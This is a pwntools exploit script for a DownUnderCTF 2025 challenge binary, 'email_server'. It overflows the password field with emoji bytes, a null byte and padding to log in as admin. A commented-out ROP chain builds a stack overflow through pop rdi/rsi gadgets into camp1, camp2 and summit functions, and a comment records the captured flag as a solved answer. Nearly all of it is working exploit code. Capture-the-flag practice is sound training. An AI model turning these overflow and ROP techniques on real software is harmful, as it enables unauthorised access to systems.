from pwn import *

# flag = "DUCTF{wow_you_really_boiled_the_ocean_the_shareholders_thankyou}"

context.terminal =  ["tmux", "splitw", "-h"] 
context.endian = 'little'
BINARY = "./email_server"
HOST = "chal.2025-us.ductf.net"
PORT = 30000

elf = ELF(BINARY)

def start_binary():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

# rop = ROP(elf)

# start process
p = start_binary()

if not args.REMOTE and args.GDB:
    gdb.attach(p, """
    b* print_buf
    b* camp2
    b* camp1
    b* summit
    c
    """)

print(p.recvuntil(b"username: ").decode())
p.sendline(b"guest")
payload = '🇦🇩🇲🇮🇳\0'.encode('utf-8') + b"A"*11 + b"admin"
p.recvuntil(b"password: ")
p.sendline(payload)
print(p.recv().decode())
p.interactive()
# POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
# RET = (rop.find_gadget(['ret']))[0]
# CAMP1 = elf.symbols['camp1']
# CAMP2 = elf.symbols['camp2']
# SUMMIT = elf.symbols['summit']
# MAIN = elf.symbols['main']
# POP_RSI = (rop.find_gadget(['pop rsi', 'ret']))[0]
# log.info("CAMP1 func: " + hex(CAMP1))
# log.info("CAMP2 func: " + hex(CAMP2))
# log.info("SUMMIT func: " + hex(SUMMIT))
# log.info("MAIN func: " + hex(MAIN))
# log.info("pop rdi gadget: " + hex(POP_RDI))
# log.info("pop rsi gadget: " + hex(POP_RSI))
# log.info("ret: " + hex(RET))

# # run process until it encounters help?)
# p.recvuntil(b"help?)\n")

# payload = b"A"*56 # Overflows the stack by 48 then add 8 bytes for stack alignment
# payload += p64(RET) # jump return instruction because remote is weird
# payload += p64(CAMP1) # jump to the camp1 function
# payload += p64(RET) # jump to the camp1 function
# payload += p64(MAIN)
# payload += p64(POP_RDI) # once camp1 returns jump to POP_RDI instruction
# payload += b"g" + b"A"*7 # camp2 requires register al to be the letter g so put that first and then pad by 7 bytes
# payload += p64(CAMP2) # jump to camp2 function
# payload += p64(POP_RDI) # need to jump back to another POP_RDI so the letter c is put in the lower rdi register
# payload += b"c" + b"A"*7 
# payload += p64(POP_RSI) # jump to a pop rsi instruction for the next if check in summit
# payload += b"tf" + b"A"*6
# payload += p64(SUMMIT) # jump to the summit function
# p.sendline(payload)
# print(p.recv())